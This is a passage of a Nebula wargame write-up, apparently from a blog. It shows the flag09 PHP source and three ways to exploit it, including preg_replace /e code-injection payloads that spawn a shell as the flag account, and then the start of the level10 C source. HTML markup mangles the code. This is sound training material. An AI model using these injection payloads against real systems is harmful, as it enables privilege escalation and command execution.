</span><span class='line'>  <span class="nv">$email</span> <span class="o">=</span> <span class="nb">preg_replace</span><span class="p">(</span><span class="o">&amp;</span><span class="nx">ldquo</span><span class="p">;</span><span class="o">/@/&amp;</span><span class="nx">rdquo</span><span class="p">;,</span> <span class="o">&amp;</span><span class="nx">ldquo</span><span class="p">;</span> <span class="nx">AT</span> <span class="o">&amp;</span><span class="nx">rdquo</span><span class="p">;,</span> <span class="nv">$email</span><span class="p">);</span><span class="o">&lt;/</span><span class="nx">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="nx">p</span><span class="o">&gt;</span>  <span class="k">return</span> <span class="nv">$email</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span><span class="o">&lt;/</span><span class="nx">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="nx">p</span><span class="o">&gt;</span><span class="k">function</span> <span class="nf">markup</span><span class="p">(</span><span class="nv">$filename</span><span class="p">,</span> <span class="nv">$use_me</span><span class="p">)</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>  <span class="nv">$contents</span> <span class="o">=</span> <span class="nb">file_get_contents</span><span class="p">(</span><span class="nv">$filename</span><span class="p">);</span><span class="o">&lt;/</span><span class="nx">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="nx">p</span><span class="o">&gt;</span>  <span class="nv">$contents</span> <span class="o">=</span> <span class="nb">preg_replace</span><span class="p">(</span><span class="o">&amp;</span><span class="nx">ldquo</span><span class="p">;</span><span class="o">/</span><span class="p">([</span><span class="nx">email</span> <span class="p">(</span><span class="o">.*</span><span class="p">)])</span><span class="o">/</span><span class="nx">e</span><span class="o">&amp;</span><span class="nx">rdquo</span><span class="p">;,</span> <span class="o">&amp;</span><span class="nx">ldquo</span><span class="p">;</span><span class="nx">spam</span><span class="p">(</span><span class="nx">\</span><span class="o">&amp;</span><span class="nx">rdquo</span><span class="p">;</span><span class="nx">\2\</span><span class="o">&amp;</span><span class="nx">ldquo</span><span class="p">;)</span><span class="o">&amp;</span><span class="nx">rdquo</span><span class="p">;,</span> <span class="nv">$contents</span><span class="p">);</span>
</span><span class='line'>  <span class="nv">$contents</span> <span class="o">=</span> <span class="nb">preg_replace</span><span class="p">(</span><span class="o">&amp;</span><span class="nx">ldquo</span><span class="p">;</span><span class="o">/</span><span class="p">[</span><span class="o">/&amp;</span><span class="nx">rdquo</span><span class="p">;,</span> <span class="o">&amp;</span><span class="nx">ldquo</span><span class="p">;</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="o">&amp;</span><span class="nx">rdquo</span><span class="p">;,</span> <span class="nv">$contents</span><span class="p">);</span>
</span><span class='line'>  <span class="nv">$contents</span> <span class="o">=</span> <span class="nb">preg_replace</span><span class="p">(</span><span class="o">&amp;</span><span class="nx">ldquo</span><span class="p">;</span><span class="o">/</span><span class="p">]</span><span class="o">/&amp;</span><span class="nx">rdquo</span><span class="p">;,</span> <span class="o">&amp;</span><span class="nx">ldquo</span><span class="p">;</span><span class="o">&gt;&amp;</span><span class="nx">rdquo</span><span class="p">;,</span> <span class="nv">$contents</span><span class="p">);</span><span class="o">&lt;/</span><span class="nx">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="nx">p</span><span class="o">&gt;</span>  <span class="k">return</span> <span class="nv">$contents</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span><span class="o">&lt;/</span><span class="nx">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="nx">p</span><span class="o">&gt;</span><span class="nv">$output</span> <span class="o">=</span> <span class="nx">markup</span><span class="p">(</span><span class="nv">$argv</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="nv">$argv</span><span class="p">[</span><span class="mi">2</span><span class="p">]);</span><span class="o">&lt;/</span><span class="nx">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="nx">p</span><span class="o">&gt;</span><span class="k">print</span> <span class="nv">$output</span><span class="p">;</span><span class="o">&lt;/</span><span class="nx">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="nx">p</span><span class="o">&gt;?&gt;</span>
</span></code></pre></td></tr></table></div></figure></p>

<p>Because the flag09 binary is interpreted via php shell, there is a trivial solution:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>level09@nebula:/home/flag09$ ./flag09 -h
</span><span class='line'>Usage: php [options] [-f] &lt;file> [&ndash;] [args&hellip;]
</span><span class='line'>       php [options] -r &lt;code> [&ndash;] [args&hellip;]
</span><span class='line'>       php [options] [-B &lt;begin_code>] -R &lt;code> [-E &lt;end_code>] [&ndash;] [args&hellip;]
</span><span class='line'>       php [options] [-B &lt;begin_code>] -F &lt;file> [-E &lt;end_code>] [&ndash;] [args&hellip;]
</span><span class='line'>       php [options] &ndash; [args&hellip;]
</span><span class='line'>       php [options] -a&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>  -a               Run as interactive shell
</span><span class='line'>  -c &lt;path>|&lt;file> Look for php.ini file in this directory
</span><span class='line'>  -n               No php.ini file will be used
</span><span class='line'>  -d foo[=bar]     Define INI entry foo with value &lsquo;bar&rsquo;
</span><span class='line'>  -e               Generate extended information for debugger/profiler
</span><span class='line'>  -f &lt;file>        Parse and execute &lt;file>.
</span><span class='line'>  -h               This help
</span><span class='line'>  -i               PHP information
</span><span class='line'>  -l               Syntax check only (lint)
</span><span class='line'>  -m               Show compiled in modules
</span><span class='line'>  -r &lt;code>        Run PHP &lt;code> without using script tags &lt;?..?>
</span><span class='line'>  -B &lt;begin_code>  Run PHP &lt;begin_code> before processing input lines
</span><span class='line'>  -R &lt;code>        Run PHP &lt;code> for every input line
</span><span class='line'>  -F &lt;file>        Parse and execute &lt;file> for every input line
</span><span class='line'>  -E &lt;end_code>    Run PHP &lt;end_code> after processing all input lines
</span><span class='line'>  -H               Hide any passed arguments from external tools.
</span><span class='line'>  -s               Output HTML syntax highlighted source.
</span><span class='line'>  -v               Version number
</span><span class='line'>  -w               Output source with stripped comments and whitespace.
</span><span class='line'>  -z &lt;file>        Load Zend extension &lt;file>.&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>  args&hellip;          Arguments passed to script. Use &ndash; args when first argument
</span><span class='line'>                   starts with - or script is read from stdin&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>  &ndash;ini            Show configuration file names&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>  &ndash;rf &lt;name>      Show information about function &lt;name>.
</span><span class='line'>  &ndash;rc &lt;name>      Show information about class &lt;name>.
</span><span class='line'>  &ndash;re &lt;name>      Show information about extension &lt;name>.
</span><span class='line'>  &ndash;ri &lt;name>      Show configuration for extension &lt;name>.&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>level09@nebula:/home/flag09$ ./flag09 -a
</span><span class='line'>Interactive shell&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>php > system(&lsquo;id&rsquo;);
</span><span class='line'>uid=1010(level09) gid=1010(level09) euid=990(flag09) groups=990(flag09),1010(level09)
</span><span class='line'>php > system(&lsquo;getflag&rsquo;);
</span><span class='line'>You have successfully executed getflag on a target account</span></code></pre></td></tr></table></div></figure></p>

<p>Second way how to solve this challenge is to use PCRE pattern modifiers vulnerability in <a href="https://php.net/manual/en/reference.pcre.pattern.modifiers.php">PREG_REPLACE_EVAL</a>.</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class='console'><span class='line'><span class="gp">sh-4.2$</span> cat /tmp/09
</span><span class='line'><span class="go">[email &lt;a href=&quot;&amp;#x6d;&amp;#x61;&amp;#105;&amp;#x6c;&amp;#x74;&amp;#111;&amp;#58;&amp;#x62;&amp;#108;&amp;#97;&amp;#x40;&amp;#x62;&amp;#x6c;&amp;#x61;&amp;#x62;&amp;#108;&amp;#97;&amp;#x2e;&amp;#99;&amp;#x6f;&amp;#109;&quot;&gt;&amp;#98;&amp;#108;&amp;#97;&amp;#x40;&amp;#98;&amp;#108;&amp;#x61;&amp;#98;&amp;#x6c;&amp;#x61;&amp;#x2e;&amp;#99;&amp;#111;&amp;#109;&lt;/a&gt;]&lt;/p&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="go">&lt;p&gt;sh-4.2$ ./flag09 /tmp/09 testing</span>
</span><span class='line'><span class="go">bla AT blabla dot com</span>
</span></code></pre></td></tr></table></div></figure></p>

<p>Because we cannot use quotes, we can inject something with <a href="https://php.net/manual/en/language.types.string.php#language.types.string.parsing.complex">complex (curly) syntax</a>, that could be used
for strings representation.</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>sh-4.2$ cat /tmp/09
</span><span class='line'>[email {${phpinfo()}}]&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>sh-4.2$ ./flag09 /tmp/09 | head
</span><span class='line'>PHP Notice:  Undefined offset: 2 in /home/flag09/flag09.php on line 22
</span><span class='line'>phpinfo()
</span><span class='line'>PHP Version => 5.3.6-13ubuntu3.2&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>System => Linux nebula 3.0.0-12-generic #20-Ubuntu SMP Fri Oct 7 14:50:42 UTC 2011 i686
</span><span class='line'>Build Date => Oct 13 2011 23:17:32
</span><span class='line'>Server API => Command Line Interface
</span><span class='line'>Virtual Directory Support => disabled
</span><span class='line'>Configuration File (php.ini) Path => /etc/php5/cli
</span><span class='line'>Loaded Configuration File => /etc/php5/cli/php.ini
</span><span class='line'>Scan this dir for additional .ini files => /etc/php5/cli/conf.d</span></code></pre></td></tr></table></div></figure></p>

<p>Here the second argument $use_me is invoked:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class='console'><span class='line'><span class="gp">sh-4.2$</span> cat /tmp/09
</span><span class='line'><span class="go">[email {${system($use_me)}}]&lt;/p&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="go">&lt;p&gt;sh-4.2$ ./flag09 /tmp/09 getflag</span>
</span><span class='line'><span class="go">You have successfully executed getflag on a target account</span>
</span><span class='line'><span class="go">PHP Notice:  Undefined variable: You have successfully executed getflag on a target account in /home/flag09/flag09.php(15) : regexp code on line 1</span>
</span></code></pre></td></tr></table></div></figure></p>

<p>Actually, I have found the third solution without using $use_me parameter, but recycling $filename:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
</pre></td><td class='code'><pre><code class='console'><span class='line'><span class="gp">sh-4.2$</span> cat /tmp/09
</span><span class='line'><span class="go">[email {${system($filename)}}]</span>
</span><span class='line'><span class="go">/bin/sh&lt;/p&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="go">&lt;p&gt;sh-4.2$ chmod +x /tmp/09&lt;/p&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="go">&lt;p&gt;sh-4.2$ id</span>
</span><span class='line'><span class="go">uid=1010(level09) gid=1010(level09) groups=1010(level09)&lt;/p&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="go">&lt;p&gt;sh-4.2$ /home/flag09/flag09 /tmp/09</span>
</span><span class='line'><span class="go">PHP Notice:  Undefined offset: 2 in /home/flag09/flag09.php on line 22</span>
</span><span class='line'><span class="go">/tmp/09: line 1: {${system($filename)}}]: bad substitution&lt;/p&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="go">&lt;p&gt;sh-4.2$ id</span>
</span><span class='line'><span class="go">uid=1010(level09) gid=1010(level09) euid=990(flag09) groups=990(flag09),1010(level09)&lt;/p&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="go">&lt;p&gt;sh-4.2$ getflag</span>
</span><span class='line'><span class="go">You have successfully executed getflag on a target account</span>
</span></code></pre></td></tr></table></div></figure></p>

<h2>Level10</h2>

<p><figure class='code'><figcaption><span>basic.c </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
<span class='line-number'>72</span>
<span class='line-number'>73</span>
<span class='line-number'>74</span>
<span class='line-number'>75</span>
<span class='line-number'>76</span>
<span class='line-number'>77</span>
<span class='line-number'>78</span>
<span class='line-number'>79</span>
<span class='line-number'>80</span>
<span class='line-number'>81</span>
<span class='line-number'>82</span>
<span class='line-number'>83</span>
<span class='line-number'>84</span>
<span class='line-number'>85</span>
<span class='line-number'>86</span>
<span class='line-number'>87</span>
<span class='line-number'>88</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">include</span> <span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span><span class="n">stdlib</span><span class="p">.</span><span class="n">h</span><span class="o">&gt;&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">include</span> <span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span><span class="n">unistd</span><span class="p">.</span><span class="n">h</span><span class="o">&gt;&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">include</span> <span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span><span class="n">sys</span><span class="o">/</span><span class="n">types</span><span class="p">.</span><span class="n">h</span><span class="o">&gt;&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">include</span> <span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span><span class="n">stdio</span><span class="p">.</span><span class="n">h</span><span class="o">&gt;&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">include</span> <span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span><span class="n">fcntl</span><span class="p">.</span><span class="n">h</span><span class="o">&gt;&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">include</span> <span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span><span class="n">errno</span><span class="p">.</span><span class="n">h</span><span class="o">&gt;&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">include</span> <span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span><span class="n">sys</span><span class="o">/</span><span class="n">socket</span><span class="p">.</span><span class="n">h</span><span class="o">&gt;&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">include</span> <span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span><span class="n">netinet</span><span class="o">/</span><span class="n">in</span><span class="p">.</span><span class="n">h</span><span class="o">&gt;&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">include</span> <span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span><span class="n">string</span><span class="p">.</span><span class="n">h</span><span class="o">&gt;&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="kt">int</span> <span class="n">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">&lt;</span><span class="n">em</span><span class="o">&gt;&lt;</span><span class="n">em</span><span class="o">&gt;</span><span class="n">argv</span><span class="p">)</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>  <span class="kt">char</span> <span class="o">&lt;/</span><span class="n">em</span><span class="o">&gt;</span><span class="n">file</span><span class="p">;</span>
</span><span class='line'>  <span class="kt">char</span> <span class="o">&lt;/</span><span class="n">em</span><span class="o">&gt;</span><span class="n">host</span><span class="p">;</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span>  <span class="k">if</span><span class="p">(</span><span class="n">argc</span> <span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span> <span class="mi">3</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>      <span class="n">printf</span><span class="p">(</span><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="o">%</span><span class="n">s</span> <span class="n">file</span> <span class="n">host</span><span class="err">\</span><span class="n">n</span><span class="err">\</span><span class="n">tsends</span> <span class="n">file</span> <span class="n">to</span> <span class="n">host</span> <span class="k">if</span> <span class="n">you</span> <span class="n">have</span> <span class="n">access</span> <span class="n">to</span> <span class="n">it</span><span class="err">\</span><span class="n">n</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;,</span> <span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
</span><span class='line'>      <span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
</span><span class='line'>  <span class="p">}</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span>  <span class="n">file</span> <span class="o">=</span> <span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">];</span>
</span><span class='line'>  <span class="n">host</span> <span class="o">=</span> <span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">];</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span>  <span class="k">if</span><span class="p">(</span><span class="n">access</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="n">R_OK</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>      <span class="kt">int</span> <span class="n">fd</span><span class="p">;</span>
</span><span class='line'>      <span class="kt">int</span> <span class="n">ffd</span><span class="p">;</span>
</span><span class='line'>      <span class="kt">int</span> <span class="n">rc</span><span class="p">;</span>
</span><span class='line'>      <span class="k">struct</span> <span class="n">sockaddr_in</span> <span class="n">sin</span><span class="p">;</span>
</span><span class='line'>      <span class="kt">char</span> <span class="n">buffer</span><span class="p">[</span><span class="mi">4096</span><span class="p">];</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">pre</span><span class="o">&gt;&lt;</span><span class="n">code</span><span class="o">&gt;</span>  <span class="n">printf</span><span class="p">(</span><span class="s">&quot;Connecting to %s:18211 .. &quot;</span><span class="p">,</span> <span class="n">host</span><span class="p">);</span> <span class="n">fflush</span><span class="p">(</span><span class="n">stdout</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">fd</span> <span class="o">=</span> <span class="n">socket</span><span class="p">(</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">SOCK_STREAM</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">memset</span><span class="p">(</span><span class="o">&amp;</span><span class="n">amp</span><span class="p">;</span><span class="n">sin</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="k">struct</span> <span class="n">sockaddr_in</span><span class="p">));</span>
</span><span class='line'>  <span class="n">sin</span><span class="p">.</span><span class="n">sin_family</span> <span class="o">=</span> <span class="n">AF_INET</span><span class="p">;</span>
</span><span class='line'>  <span class="n">sin</span><span class="p">.</span><span class="n">sin_addr</span><span class="p">.</span><span class="n">s_addr</span> <span class="o">=</span> <span class="n">inet_addr</span><span class="p">(</span><span class="n">host</span><span class="p">);</span>
</span><span class='line'>  <span class="n">sin</span><span class="p">.</span><span class="n">sin_port</span> <span class="o">=</span> <span class="n">htons</span><span class="p">(</span><span class="mi">18211</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">if</span><span class="p">(</span><span class="n">connect</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">amp</span><span class="p">;</span><span class="n">sin</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="k">struct</span> <span class="n">sockaddr_in</span><span class="p">))</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>      <span class="n">printf</span><span class="p">(</span><span class="s">&quot;Unable to connect to host %s</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">host</span><span class="p">);</span>
</span><span class='line'>      <span class="n">exit</span><span class="p">(</span><span class="n">EXIT_FAILURE</span><span class="p">);</span>
</span><span class='line'>  <span class="p">}</span>
</span><span class='line'><span class="o">&lt;/</span><span class="n">code</span><span class="o">&gt;&lt;/</span><span class="n">pre</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">define</span> <span class="n">HITHERE</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;.</span><span class="n">oO</span> <span class="n">Oo</span><span class="p">.</span><span class="err">\</span><span class="n">n</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span><span class="o">&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">pre</span><span class="o">&gt;&lt;</span><span class="n">code</span><span class="o">&gt;</span>  <span class="k">if</span><span class="p">(</span><span class="n">write</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">HITHERE</span><span class="p">,</span> <span class="n">strlen</span><span class="p">(</span><span class="n">HITHERE</span><span class="p">))</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>      <span class="n">printf</span><span class="p">(</span><span class="s">&quot;Unable to write banner to host %s</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">host</span><span class="p">);</span>
</span><span class='line'>      <span class="n">exit</span><span class="p">(</span><span class="n">EXIT_FAILURE</span><span class="p">);</span>
</span><span class='line'>  <span class="p">}</span>
</span><span class='line'><span class="o">&lt;/</span><span class="n">code</span><span class="o">&gt;&lt;/</span><span class="n">pre</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">undef</span> <span class="n">HITHERE</span><span class="o">&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">pre</span><span class="o">&gt;&lt;</span><span class="n">code</span><span class="o">&gt;</span>  <span class="n">printf</span><span class="p">(</span><span class="s">&quot;Connected!</span><span class="se">\n</span><span class="s">Sending file .. &quot;</span><span class="p">);</span> <span class="n">fflush</span><span class="p">(</span><span class="n">stdout</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">ffd</span> <span class="o">=</span> <span class="n">open</span><span class="p">(</span><span class="n">file</span><span class="p">,</span> <span class="n">O_RDONLY</span><span class="p">);</span>
</span><span class='line'>  <span class="k">if</span><span class="p">(</span><span class="n">ffd</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>      <span class="n">printf</span><span class="p">(</span><span class="s">&quot;Damn. Unable to open file</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
</span><span class='line'>      <span class="n">exit</span><span class="p">(</span><span class="n">EXIT_FAILURE</span><span class="p">);</span>
</span><span class='line'>  <span class="p">}</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">rc</span> <span class="o">=</span> <span class="n">read</span><span class="p">(</span><span class="n">ffd</span><span class="p">,</span> <span class="n">buffer</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">buffer</span><span class="p">));</span>
</span><span class='line'>  <span class="k">if</span><span class="p">(</span><span class="n">rc</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>      <span class="n">printf</span><span class="p">(</span><span class="s">&quot;Unable to read from file: %s</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">strerror</span><span class="p">(</span><span class="n">errno</span><span class="p">));</span>
